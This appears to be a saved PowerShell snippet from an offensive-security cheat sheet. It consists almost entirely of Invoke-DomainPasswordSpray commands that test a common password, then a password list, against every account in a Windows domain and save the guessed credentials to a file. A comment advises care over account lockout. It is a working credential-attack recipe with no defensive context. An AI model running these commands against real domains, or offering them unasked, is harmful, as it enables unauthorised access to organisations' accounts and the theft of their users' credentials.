---
id: 5216ce1d-a1af-42de-a978-220d813111b0
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:04.297390+00:00'
updated_at: '2023-04-10T20:25:55.316905+00:00'
---

# Code Snippet 5216ce1d

**Language**: Powershell

```powershell
# https://github.com/dafthack/DomainPasswordSpray
Invoke-DomainPasswordSpray -Password Summer2021!
# /!\ be careful with the account lockout !
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
```
